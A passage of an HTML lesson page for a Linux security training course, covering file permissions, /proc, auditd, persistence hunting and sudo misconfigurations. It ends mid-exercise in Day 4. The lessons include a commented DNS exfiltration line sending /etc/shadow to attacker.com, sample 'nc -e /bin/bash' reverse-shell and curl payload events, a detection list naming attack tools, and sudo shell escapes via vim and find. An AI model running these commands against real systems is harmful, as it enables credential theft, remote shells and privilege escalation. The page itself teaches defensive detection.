@@ -1,0 +1,737 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Week 03 — Linux OS Security</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script></head>
+<body data-site="cyber">
+<header class="top"><div class="in">
+<a class="brand" href="index.html">Cyber Track</a>
+<a href="index.html">Weeks</a><a href="play.html">Playground</a><a href="../index.html">All sites</a>
+<span class="sp"></span><span class="prog" id="prog"></span>
+</div></header>
+<main>
+<h1>Week 03 — Linux OS Security</h1><div class="toc"><a class="btn ghost" href="#day-1">Day 1</a><a class="btn ghost" href="#day-2">Day 2</a><a class="btn ghost" href="#day-3">Day 3</a><a class="btn ghost" href="#day-4">Day 4</a><a class="btn ghost" href="#day-5">Day 5</a></div><p class="note">Done this week: <span data-week-count="03" data-size="5"></span></p><p class="note">Code blocks run in your browser. <button class="ghost" id="resetpy" type="button">Reset Python session</button></p><h1>Week 03 — Linux OS Security</h1>
+<h2>Metadata</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phase</td>
+<td>1 — Foundations</td>
+</tr>
+<tr>
+<td>Cert Alignment</td>
+<td>BTL1: Linux forensics / GCIA: Linux system analysis</td>
+</tr>
+<tr>
+<td>Royal Road</td>
+<td>Extend pipeline: syslog/auditd → unified normalized schema</td>
+</tr>
+<tr>
+<td>Prerequisites</td>
+<td>W01 — Networking Foundations, W02 — Windows OS Internals</td>
+</tr>
+<tr>
+<td>Est. Hours</td>
+<td>8–10 hrs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="day-1">Day 1 — Linux File System and Permissions</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="03-1"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=KMA3O-sXiSU" target="_blank" rel="noopener"><b>Linux File System Hierarchy and Structure | Linux Top-Level Directories Explained</b><small>ComputerNetworkingNotes</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Linux%20file%20system%20structure%20security%20explained" target="_blank" rel="noopener">Linux file system structure security explained</a></p></div>
+<hr />
+<h3>Concept 1 — The Linux File System Hierarchy</h3>
+<p>The Linux file system is a single tree rooted at <code>/</code>. Every file, device, and process is represented as a file somewhere in this tree. Knowing which directories hold what is essential for forensic investigation — if a malware dropper writes a file to <code>/tmp</code> or hides a binary in <code>/usr/local/bin</code>, you need to know that is unexpected.</p>
+<p>Key directories for security analysis:</p>
+<ul>
+<li><code>/etc</code> — system-wide configuration (passwd, shadow, sudoers, cron jobs)</li>
+<li><code>/var/log</code> — log files (auth.log, syslog, audit/audit.log)</li>
+<li><code>/tmp</code> and <code>/var/tmp</code> — world-writable; a common attacker staging area</li>
+<li><code>/proc</code> — virtual filesystem exposing kernel and process state in real time</li>
+<li><code>/home</code> and <code>/root</code> — user home directories; <code>.bashrc</code>, <code>.ssh/authorized_keys</code></li>
+<li><code>/usr/bin</code>, <code>/usr/sbin</code> — system binaries; unexpected new binaries here are a red flag</li>
+<li><code>/dev/shm</code> — shared memory; used by fileless malware to stage payloads in RAM</li>
+</ul>
+<p>Data engineering analogy: the Linux file system hierarchy is like a data lake with well-defined zones. <code>/etc</code> is your configuration bucket (read-only for most consumers). <code>/var/log</code> is your logs bucket. <code>/tmp</code> is a scratch zone that should never contain long-lived data — if it does, something is wrong, just like finding a 3 GB CSV in your scratch prefix that has been there for 6 months.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Interesting files for a threat hunter:
+/etc/passwd           # all user accounts (no passwords — those are in /etc/shadow)
+/etc/shadow           # hashed passwords — readable only by root
+/etc/sudoers          # who can run commands as root
+/etc/cron.d/          # scheduled tasks — persistence mechanism
+/var/log/auth.log     # authentication events (Debian/Ubuntu)
+/var/log/secure       # authentication events (RHEL/CentOS)
+/var/log/audit/audit.log  # auditd events — most detailed Linux telemetry
+
+# Find files modified in the last 24 hours in /usr/bin:
+find /usr/bin -mtime -1 -type f
+# Any result is suspicious — system binaries should not change day to day
+</code></pre><p><strong>Exercise:</strong>
+On a Linux VM or WSL instance, run:</p>
+<pre><code>find /etc -name &quot;*.conf&quot; -mtime -7 -type f 2&gt;/dev/null
+</code></pre><p>Then run:</p>
+<pre><code>find /tmp /var/tmp -type f 2&gt;/dev/null
+</code></pre><p>For each file found in <code>/tmp</code>, note its name, size, and modification time.
+Expected output: a list of files modified in <code>/etc</code> in the last week, and a list (possibly empty) of files in <code>/tmp</code>.</p>
+<hr />
+<h3>Concept 2 — Linux File Permissions and SUID/SGID</h3>
+<p>Linux permissions control who can read, write, or execute each file. Every file has three permission triplets: owner, group, and others. As a security analyst, the critical cases are:</p>
+<ul>
+<li><strong>World-writable files</strong> (<code>-rw-rw-rw-</code> or <code>chmod 777</code>) in sensitive directories</li>
+<li><strong>SUID bit</strong> (<code>-rwsr-xr-x</code>) — the file executes as the file's owner, not the caller. A SUID binary owned by root runs as root regardless of who runs it. Attackers exploit SUID binaries for privilege escalation.</li>
+<li><strong>SGID bit</strong> — same concept but for the group</li>
+</ul>
+<p>Data engineering analogy: SUID is like a stored procedure that runs as the DBA user regardless of who calls it. If an attacker can manipulate a SUID binary, they escalate to root — the equivalent of a data analyst calling a stored proc that grants them table-owner privileges.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Find all SUID binaries on the system:
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Typical output (these are legitimate):
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+
+# Suspicious output (unexpected SUID binary in a non-standard location):
+/tmp/backdoor        # SUID binary in /tmp — immediate red flag
+/home/user/.local/bin/shell  # SUID binary in user home dir — red flag
+
+# Check permissions of a specific file:
+ls -la /usr/bin/passwd
+# -rwsr-xr-x 1 root root 68208 Jan 15 2024 /usr/bin/passwd
+#    ^                                       (s = SUID bit set)
+</code></pre><p><strong>Exercise:</strong>
+Run the SUID find command above on your Linux system.
+For each result outside of <code>/usr/bin</code>, <code>/usr/sbin</code>, <code>/bin</code>, and <code>/sbin</code>, note the file path and owner.
+Then check GTFOBins (gtfobins.github.io) — it lists which SUID binaries can be abused for privilege escalation.
+Expected output: a list of SUID binaries with their paths, owners, and whether they appear on GTFOBins.</p>
+<hr />
+<h3>Concept 3 — /proc: The Live Process Filesystem</h3>
+<p><code>/proc</code> is a virtual filesystem that the kernel populates in real time. Every running process has a directory <code>/proc/&lt;PID&gt;/</code> containing:</p>
+<ul>
+<li><code>cmdline</code> — the full command line used to start the process</li>
+<li><code>exe</code> — a symlink to the actual binary on disk</li>
+<li><code>maps</code> — memory map (all loaded libraries and memory regions)</li>
+<li><code>fd/</code> — all open file descriptors (files, sockets, pipes)</li>
+<li><code>net/tcp</code> — active TCP connections for this process</li>
+</ul>
+<p>This is invaluable for live forensics: you can find a process running from a deleted file (<code>exe</code> symlink shows <code>(deleted)</code>), see what network connections a process has open, and inspect the full command line of any process.</p>
+<p>Data engineering analogy: <code>/proc</code> is a live introspection API for the kernel — like a metrics endpoint that exposes the internal state of every running job in your pipeline. No agent needed; it is always there.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Find processes running from deleted binaries (fileless execution indicator):
+for pid in /proc/[0-9]*/exe; do
+    target=$(readlink &quot;$pid&quot; 2&gt;/dev/null)
+    if [[ &quot;$target&quot; == *&quot;(deleted)&quot;* ]]; then
+        echo &quot;PID $(basename $(dirname $pid)): $target&quot;
+    fi
+done
+
+# Show all network connections for a specific process (PID 1234):
+cat /proc/1234/net/tcp
+# Or use ss / netstat:
+ss -p | grep 1234
+
+# See full command line of PID 1234:
+cat /proc/1234/cmdline | tr &#x27;\0&#x27; &#x27; &#x27;
+</code></pre><p><strong>Exercise:</strong>
+On your Linux system, pick any running process (e.g., your shell — find its PID with <code>echo $$</code>).
+Read the following for that PID:</p>
+<ol>
+<li><code>cat /proc/&lt;PID&gt;/cmdline | tr '\0' ' '</code> — what command started it?</li>
+<li><code>ls -la /proc/&lt;PID&gt;/fd/</code> — how many file descriptors does it have open?</li>
+<li><code>cat /proc/&lt;PID&gt;/status | grep VmRSS</code> — how much physical RAM is it using?</li>
+</ol>
+<p>Expected output: three lines showing command line, file descriptor count, and RSS memory for your chosen process.</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs for Linux forensic triage
+<strong>Threat:</strong> An attacker uses LLM-generated shell one-liners to create highly obfuscated bash scripts that evade pattern-based detection while performing reconnaissance or exfiltration.
+<strong>Opportunity:</strong> Paste a suspicious bash script or command into an LLM and ask it to explain step by step what each line does and what the script's overall intent is. Useful for triage when an analyst is unfamiliar with shell scripting tricks.
+<strong>Prompt to try:</strong> <code>&quot;Explain this bash command line step by step, then give a one-sentence summary of its overall intent and flag any network activity, file writes, or privilege escalation attempts: [paste command]&quot;</code></p>
+<hr />
+<h2 id="day-2">Day 2 — Linux Logging and auditd</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="03-2"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=lc1i9h1GyMA" target="_blank" rel="noopener"><b>Detecting Exploits - OMIGod (Linux Logging with Auditd)</b><small>IppSec</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Linux%20auditd%20tutorial%20security%20monitoring" target="_blank" rel="noopener">Linux auditd tutorial security monitoring</a></p></div>
+<hr />
+<h3>Concept 1 — Linux Log Files and Log Sources</h3>
+<p>Linux writes logs to <code>/var/log/</code>. The most important log files for a detection engineer:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/var/log/auth.log</code> (Debian) or <code>/var/log/secure</code> (RHEL)</td>
+<td>SSH logins, sudo usage, PAM authentication</td>
+</tr>
+<tr>
+<td><code>/var/log/syslog</code> or <code>/var/log/messages</code></td>
+<td>General system events</td>
+</tr>
+<tr>
+<td><code>/var/log/kern.log</code></td>
+<td>Kernel messages (driver load, kernel module events)</td>
+</tr>
+<tr>
+<td><code>/var/log/audit/audit.log</code></td>
+<td>auditd events — the most detailed telemetry source</td>
+</tr>
+<tr>
+<td><code>/var/log/wtmp</code> / <code>/var/log/btmp</code></td>
+<td>Login history / failed login history (binary format)</td>
+</tr>
+<tr>
+<td><code>/var/log/lastlog</code></td>
+<td>Last login per user (binary format)</td>
+</tr>
+<tr>
+<td><code>/var/log/cron</code></td>
+<td>Cron job execution</td>
+</tr>
+<tr>
+<td><code>~/.bash_history</code></td>
+<td>Per-user command history (easily cleared — not reliable)</td>
+</tr>
+</tbody>
+</table>
+<p>Data engineering analogy: <code>/var/log/auth.log</code> is your authentication events stream — like Okta or Azure AD Sign-In logs but for local Linux access. <code>audit.log</code> is your detailed audit trail — like BigQuery's data access audit logs at the OS level.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Parse failed SSH logins from auth.log:
+grep &quot;Failed password&quot; /var/log/auth.log | tail -20
+# Output:
+# Jan 15 09:23:41 server sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2
+# Jan 15 09:23:43 server sshd[1234]: Failed password for root from 192.168.1.100 port 54322 ssh2
+
+# Count failed attempts per source IP:
+grep &quot;Failed password&quot; /var/log/auth.log \
+  | awk &#x27;{print $(NF-3)}&#x27; \
+  | sort | uniq -c | sort -rn | head -10
+
+# Parse wtmp (binary login history) with Python:
+import struct
+# wtmp uses fixed-size records — use &#x27;last&#x27; command instead:
+# last -n 20
+</code></pre><p><strong>Exercise:</strong>
+On your Linux system, run:</p>
+<pre><code>grep &quot;Failed password\|Accepted password\|Accepted publickey&quot; /var/log/auth.log | tail -30
+</code></pre><p>For each Accepted line: note the username, source IP, and authentication method.
+For each Failed line: note the username and source IP.
+If your auth.log is empty, use: <code>journalctl -u sshd --since &quot;1 hour ago&quot;</code> instead.
+Expected output: a list of recent SSH authentication events split into accepted and failed.</p>
+<hr />
+<h3>Concept 2 — auditd: The Linux Audit Daemon</h3>
+<p><code>auditd</code> is the most powerful telemetry source on Linux. It can log every system call, file access, command execution, and network connection. You configure rules that specify what to monitor.</p>
+<p>Data engineering analogy: auditd is like enabling full SQL query logging on your database — you see every statement executed, by which user, from which connection. By default it is off or minimal; you enable the rules that matter for your use case.</p>
+<p>Key auditd rule syntax:</p>
+<pre><code>-a always,exit -F arch=b64 -S execve -k exec_commands
+</code></pre><ul>
+<li><code>-a always,exit</code> — always add a record on syscall exit</li>
+<li><code>-F arch=b64</code> — filter: 64-bit processes only</li>
+<li><code>-S execve</code> — syscall: execve (any command execution)</li>
+<li><code>-k exec_commands</code> — tag this rule so you can grep for it</li>
+</ul>
+<p>Critical auditd rule sets: the Linux Audit System project publishes recommended rules at github.com/bfuzzy1/auditd-attack — mapped directly to MITRE ATT&amp;CK.</p>
+<p><strong>Example:</strong></p>
+<pre><code># /etc/audit/rules.d/security.rules — minimal detection ruleset
+
+# Log all command executions:
+-a always,exit -F arch=b64 -S execve -k exec_commands
+-a always,exit -F arch=b32 -S execve -k exec_commands
+
+# Log privilege escalation via sudo:
+-w /usr/bin/sudo -p x -k sudo_usage
+
+# Log changes to passwd and shadow:
+-w /etc/passwd -p wa -k identity_change
+-w /etc/shadow -p wa -k identity_change
+
+# Log SSH authorized_keys modifications:
+-w /root/.ssh/authorized_keys -p wa -k ssh_key_add
+-w /home -p wa -k ssh_key_add
+
+# Log cron job changes:
+-w /etc/cron.d/ -p wa -k cron_modification
+-w /var/spool/cron/ -p wa -k cron_modification
+</code></pre><p><strong>Exercise:</strong>
+Enable the auditd execve rule on your Linux system:</p>
+<pre><code>sudo auditctl -a always,exit -F arch=b64 -S execve -k my_test
+</code></pre><p>Run a few commands (<code>ls</code>, <code>whoami</code>, <code>id</code>), then read the audit log:</p>
+<pre><code>sudo ausearch -k my_test | tail -20
+</code></pre><p>Find the <code>EXECVE</code> record for your <code>ls</code> command. Note the <code>argc</code> (argument count) and <code>a0</code> (the command name) fields.
+Expected output: one <code>EXECVE</code> audit record showing the command and arguments.</p>
+<hr />
+<h3>Concept 3 — Parsing auditd Logs with Python</h3>
+<p>auditd writes events in a multi-line format: one logical event spans several lines (TYPE=SYSCALL, TYPE=EXECVE, TYPE=CWD, TYPE=PATH), all linked by a timestamp and serial number. Parsing requires grouping lines by their serial number.</p>
+<p>Data engineering analogy: auditd logs are like multi-line JSON split across rows — similar to parsing a multi-line log format in a Spark job where you need to group by a correlation ID before processing.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+from collections import defaultdict
+
+def parse_audit_log(path: str) -&gt; list[dict]:
+    # Groups audit records by serial number (msg=audit(timestamp:serial))
+    groups: dict[str, dict] = defaultdict(dict)
+    order: list[str] = []
+
+    with open(path, encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            # Extract type
+            type_m = re.match(r&quot;type=(\S+)&quot;, line)
+            # Extract serial number from msg=audit(timestamp:serial)
+            serial_m = re.search(r&quot;msg=audit\([\d.]+:(\d+)\)&quot;, line)
+            if not type_m or not serial_m:
+                continue
+            rec_type = type_m.group(1)
+            serial   = serial_m.group(1)
+            # Extract all key=value pairs
+            fields = dict(re.findall(r&#x27;(\w+)=(?:&quot;([^&quot;]*?)&quot;|(\S+))&#x27;, line))
+            if serial not in groups:
+                order.append(serial)
+            groups[serial][rec_type] = fields
+
+    return [{&quot;serial&quot;: s, **groups[s]} for s in order]
+
+# Usage:
+events = parse_audit_log(&quot;/var/log/audit/audit.log&quot;)
+execve_events = [e for e in events if &quot;EXECVE&quot; in e]
+print(execve_events[0])
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Using the parser above, filter for events where <code>EXECVE</code> is present and the command (<code>a0</code> field) is one of: <code>wget</code>, <code>curl</code>, <code>nc</code>, <code>ncat</code>, <code>python</code>, <code>python3</code>, <code>bash</code>, <code>sh</code>.
+Print the timestamp, user (from the SYSCALL record's <code>uid</code> field), and full command.
+Expected output: a list of download or shell command invocations from the audit log, or an empty list if none are present.</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs for auditd rule generation
+<strong>Threat:</strong> An attacker who has read access to your auditd configuration can identify gaps in your monitoring coverage and execute attacks that fall between your rules without generating an alert.
+<strong>Opportunity:</strong> Describe an attack technique to an LLM (e.g., &quot;attacker adds an SSH key to /root/.ssh/authorized_keys&quot;) and ask it to generate the specific auditd rule that would detect it. Speeds up rule coverage gap closure significantly.
+<strong>Prompt to try:</strong> <code>&quot;Write an auditd rule that detects when any user modifies /root/.ssh/authorized_keys or any .ssh/authorized_keys file in /home. Include the correct -a flag, arch filter, syscall, path watch, and -k tag. Explain what each flag does.&quot;</code></p>
+<hr />
+<h2 id="day-3">Day 3 — Linux Networking and Network Persistence</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="03-3"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=REtsUziR4Gs" target="_blank" rel="noopener"><b>Netstat and SS Commands: Network Monitoring Tools for Beginners</b><small>CodeLucky</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Linux%20networking%20commands%20security%20investigation%20ss%20netstat" target="_blank" rel="noopener">Linux networking commands security investigation ss netstat</a></p></div>
+<hr />
+<h3>Concept 1 — Network State Investigation: ss, netstat, and /proc/net</h3>
+<p>When investigating a compromised Linux host, one of the first questions is: &quot;what network connections does this machine have, and which process owns each one?&quot; The tools <code>ss</code> and <code>netstat</code> answer this, backed by <code>/proc/net/tcp</code>.</p>
+<p>Data engineering analogy: querying network state is like running <code>SHOW PROCESSLIST</code> on a database — you get a real-time view of all active connections, their state, and which process is holding them. An unexpected connection to an external IP from a process that should have no network access is the equivalent of a pipeline worker connecting to an external API without any code authorizing it.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Show all TCP connections with process information:
+ss -tnp
+# Output:
+# State   Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process
+# ESTAB   0      0      10.0.1.15:22        10.0.0.1:54321     users:((&quot;sshd&quot;,pid=1234,fd=3))
+# LISTEN  0      128    0.0.0.0:22          0.0.0.0:*          users:((&quot;sshd&quot;,pid=999,fd=3))
+# ESTAB   0      0      10.0.1.15:44231     52.86.1.1:443      users:((&quot;curl&quot;,pid=2345,fd=5))
+
+# Find all listening ports and the process that owns them:
+ss -tlnp
+
+# Suspicious: a process with no known reason to listen on a high port
+# LISTEN  0      5      0.0.0.0:31337       0.0.0.0:*          users:((&quot;bash&quot;,pid=6666,fd=4))
+# bash listening on port 31337 = bind shell (attacker backdoor)
+
+# Read raw TCP table from /proc (useful in scripts):
+cat /proc/net/tcp  # hex-encoded — use Python&#x27;s socket.inet_ntoa(struct.pack(&#x27;&lt;L&#x27;, int(hex, 16)))
+</code></pre><p><strong>Exercise:</strong>
+Run <code>ss -tnp</code> on your Linux system. For each ESTABLISHED connection, note:</p>
+<ul>
+<li>Local address and port</li>
+<li>Remote address and port</li>
+<li>Process name and PID</li>
+</ul>
+<p>Then run <code>ss -tlnp</code> and list all listening services. For any port above 1024, verify which program is listening and whether you expect it to be there.
+Expected output: a table of connections and listeners with your &quot;expected / unexpected&quot; assessment for each.</p>
+<hr />
+<h3>Concept 2 — Linux Persistence Mechanisms</h3>
+<p>Attackers establish persistence on Linux by ensuring their code runs automatically after reboot or on a schedule. The most common mechanisms:</p>
+<ol>
+<li><strong>Cron jobs</strong> — <code>crontab -e</code> (user) or <code>/etc/cron.d/</code> (system)</li>
+<li><strong>Systemd services</strong> — <code>/etc/systemd/system/</code> — a service unit file that runs a binary</li>
+<li><strong><code>.bashrc</code> / <code>.bash_profile</code></strong> — code appended here runs every time a user opens a shell</li>
+<li><strong>SSH authorized_keys</strong> — attacker adds their public key to <code>~/.ssh/authorized_keys</code></li>
+<li><strong>SUID binary drop</strong> — attacker creates a SUID root shell</li>
+<li><strong>LD_PRELOAD hijack</strong> — environment variable that loads a library before all others; a malicious library can hook standard functions</li>
+</ol>
+<p>Data engineering analogy: Linux persistence is like injecting a rogue DAG into Airflow's DAG store. The job runs silently on schedule, and unless you are auditing the DAG list, you will not notice. <code>~/.bashrc</code> hijacking is like inserting a custom Python import hook into <code>sitecustomize.py</code> — it runs before your code without being part of your code.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Find all user crontabs:
+for user in $(cut -f1 -d: /etc/passwd); do
+    crontab -u &quot;$user&quot; -l 2&gt;/dev/null | grep -v &quot;^#&quot; | grep -v &quot;^$&quot; \
+      | while read -r line; do echo &quot;$user: $line&quot;; done
+done
+
+# Find suspicious systemd service units (not from package manager):
+find /etc/systemd/system/ /usr/lib/systemd/system/ -name &quot;*.service&quot; \
+  -newer /usr/lib/systemd/system/ssh.service 2&gt;/dev/null
+
+# Check all .ssh/authorized_keys files:
+find /home /root -name &quot;authorized_keys&quot; -type f 2&gt;/dev/null \
+  | xargs -I{} sh -c &#x27;echo &quot;=== {} ===&quot;; cat {}&#x27;
+
+# Detect LD_PRELOAD in /etc/ld.so.preload (global hijack):
+cat /etc/ld.so.preload 2&gt;/dev/null
+</code></pre><p><strong>Exercise:</strong>
+Run the crontab enumeration command above on your system. Also check:</p>
+<pre><code>cat /etc/crontab
+ls /etc/cron.d/
+ls /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
+</code></pre><p>For each cron entry, note the schedule, command, and whether the binary it calls exists and is in an expected location.
+Expected output: a list of cron entries with schedule, command path, and existence check for the binary.</p>
+<hr />
+<h3>Concept 3 — Linux Network Tools for Attackers (and Defenders)</h3>
+<p>Attackers use built-in Linux networking tools for reconnaissance and exfiltration. As a detection engineer, seeing these tools in auditd EXECVE events — especially from unusual parent processes or at unusual times — is a high-signal detection opportunity.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Reconnaissance commands — appear in EXECVE audit events:
+nmap, masscan          → port scanning (rarely legitimate on a server)
+netstat, ss            → enumerating network state (normal for admins, suspicious for www-data)
+arp, ip neigh          → ARP table enumeration (lateral movement prep)
+curl, wget             → outbound downloads (watch for non-package-manager usage)
+nc, ncat, socat        → netcat — can create bind/reverse shells
+dig, nslookup, host    → DNS queries (used in DNS tunneling)
+
+# Detection: alert when these run as unexpected users
+# www-data (web server user) running nmap or nc is almost certainly an intrusion
+# root running curl to a non-package-manager URL is suspicious
+
+# Example auditd rule to catch netcat:
+-w /usr/bin/nc -p x -k netcat_execution
+-w /usr/bin/ncat -p x -k netcat_execution
+-w /bin/nc -p x -k netcat_execution
+
+# Exfiltration via DNS (detected by high query rate or long subdomain strings):
+# dig $(cat /etc/shadow | base64 | head -c 60).attacker.com
+</code></pre><p><strong>Exercise:</strong>
+Write a Python function that reads auditd EXECVE events (parsed dicts from Day 2 Concept 3) and flags any where the <code>a0</code> field (command name) matches a list of surveillance/attack tools.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>SUSPICIOUS_COMMANDS = {
+    &quot;nmap&quot;, &quot;masscan&quot;, &quot;nc&quot;, &quot;ncat&quot;, &quot;socat&quot;, &quot;wget&quot;, &quot;curl&quot;,
+    &quot;dig&quot;, &quot;nslookup&quot;, &quot;python&quot;, &quot;python3&quot;, &quot;perl&quot;, &quot;ruby&quot;
+}
+
+# Starting data — simulated parsed EXECVE events:
+events = [
+    {&quot;serial&quot;: &quot;101&quot;, &quot;EXECVE&quot;: {&quot;argc&quot;: &quot;2&quot;, &quot;a0&quot;: &quot;ls&quot;, &quot;a1&quot;: &quot;/tmp&quot;}},
+    {&quot;serial&quot;: &quot;102&quot;, &quot;EXECVE&quot;: {&quot;argc&quot;: &quot;3&quot;, &quot;a0&quot;: &quot;curl&quot;, &quot;a1&quot;: &quot;-s&quot;, &quot;a2&quot;: &quot;http://10.0.0.99/payload&quot;}},
+    {&quot;serial&quot;: &quot;103&quot;, &quot;EXECVE&quot;: {&quot;argc&quot;: &quot;1&quot;, &quot;a0&quot;: &quot;whoami&quot;}},
+    {&quot;serial&quot;: &quot;104&quot;, &quot;EXECVE&quot;: {&quot;argc&quot;: &quot;4&quot;, &quot;a0&quot;: &quot;nc&quot;, &quot;a1&quot;: &quot;-e&quot;, &quot;a2&quot;: &quot;/bin/bash&quot;, &quot;a3&quot;: &quot;10.0.0.99 4444&quot;}},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output: two flagged events — serial 102 (curl to suspicious URL) and serial 104 (nc with -e flag indicating a reverse shell).</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs for Linux persistence hunting
+<strong>Threat:</strong> An attacker uses LLM-generated systemd unit files with legitimate-sounding names (e.g., <code>systemd-networkd-helper.service</code>) and descriptions that blend into the normal service list, making manual review ineffective.
+<strong>Opportunity:</strong> Dump all non-standard systemd service definitions and cron entries, then ask an LLM to identify any that have unusual ExecStart paths, run as root without clear justification, or have names that closely mimic built-in services (typosquatting on systemd service names).
+<strong>Prompt to try:</strong> <code>&quot;Here is a list of systemd service unit files installed on this server: [paste list with ExecStart paths]. Which ones look suspicious? Flag services running from /tmp, /home, or unusual paths, and any service name that appears to mimic a standard systemd service.&quot;</code></p>
+<hr />
+<h2 id="day-4">Day 4 — Linux User and Account Management</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="03-4"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=Le1EpBb7wfQ" target="_blank" rel="noopener"><b>How to Escalate Permissions on Linux with Sudo, Su</b><small>CBT Nuggets</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Linux%20user%20management%20sudo%20privilege%20escalation%20detection" target="_blank" rel="noopener">Linux user management sudo privilege escalation detection</a></p></div>
+<hr />
+<h3>Concept 1 — /etc/passwd, /etc/shadow, and Account Forensics</h3>
+<p><code>/etc/passwd</code> lists all accounts on the system. Each line has seven colon-separated fields: username, password placeholder, UID, GID, GECOS (description), home directory, and shell. <code>/etc/shadow</code> stores the actual password hashes (readable by root only).</p>
+<p>Forensic checks:</p>
+<ul>
+<li>UIDs 0–99 are reserved for system accounts. A non-root user with UID=0 has root privileges.</li>
+<li>A shell of <code>/bin/bash</code> for a service account is suspicious — service accounts should use <code>/sbin/nologin</code> or <code>/bin/false</code>.</li>
+<li>Locked accounts have <code>!</code> or <code>*</code> in the shadow password field.</li>
+</ul>
+<p>Data engineering analogy: <code>/etc/passwd</code> is your IAM users table. <code>/etc/shadow</code> is your secrets table. A service account with an interactive shell is like a data pipeline service account that has been granted console login — a misconfiguration that dramatically expands the blast radius of a compromise.</p>
+<p><strong>Example:</strong></p>
+<pre><code># /etc/passwd format: username:x:UID:GID:description:homedir:shell
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  # correct — no shell
+backup_agent:x:1001:1001::/home/backup_agent:/bin/bash  # suspicious — service account with shell
+
+# Find all accounts with UID 0 (should only be root):
+awk -F: &#x27;($3 == 0) {print $1}&#x27; /etc/passwd
+
+# Find all accounts with interactive shells (excludes nologin/false):
+grep -v &quot;nologin\|/bin/false\|/bin/sync&quot; /etc/passwd | awk -F: &#x27;{print $1, $7}&#x27;
+
+# Find accounts with no password (empty hash in shadow):
+sudo awk -F: &#x27;($2 == &quot;&quot; ) {print $1}&#x27; /etc/shadow
+</code></pre><p><strong>Exercise:</strong>
+Run the three commands above on your Linux system (or a test VM).
+For each user with an interactive shell: is it a human user or a service account? Should it have a shell?
+For any UID=0 account other than root: write a one-sentence explanation of why this is a critical finding.
+Expected output: list of interactive-shell accounts with your assessment, and output of the UID=0 check.</p>
+<hr />
+<h3>Concept 2 — sudo and Privilege Escalation Paths</h3>
+<p><code>sudo</code> allows specific users to run commands as root (or another user) without knowing the root password. The <code>sudoers</code> file (<code>/etc/sudoers</code> and <code>/etc/sudoers.d/</code>) defines who can run what. Misconfigurations in sudoers are a common privilege escalation path.</p>
+<p>Common misconfiguration patterns:</p>
+<ul>
+<li><code>ALL=(ALL) NOPASSWD: ALL</code> — run any command as root without a password (effectively root)</li>
+<li><code>user ALL=(ALL) NOPASSWD: /usr/bin/vim</code> — run vim as root without password → can use vim's shell escape (<code>!bash</code>)</li>
+<li><code>user ALL=(ALL) NOPASSWD: /usr/bin/find</code> → <code>sudo find / -exec /bin/bash \;</code> → root shell</li>
+</ul>
+<p>GTFOBins (gtfobins.github.io) lists every Unix binary that can be abused when run via sudo.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Check your own sudo permissions:
+sudo -l
+# Output:
+# User bob may run the following commands on server:
+#     (ALL) NOPASSWD: /usr/bin/vim    ← dangerous
+#     (www-data) NOPASSWD: /usr/bin/python3  ← less dangerous but still risky
+
+# Exploit: escalate to root via vim&#x27;s shell escape
+# sudo vim -c &#x27;:!id&#x27;
+# uid=0(root) gid=0(root)
+
+# Audit all sudoers entries:
+sudo visudo -c  # check syntax only, no edit
+cat /etc/sudoers | grep -v &quot;^#\|^$&quot;
+ls /etc/sudoers.d/
+</code></pre><p><strong>Exercise:</strong>
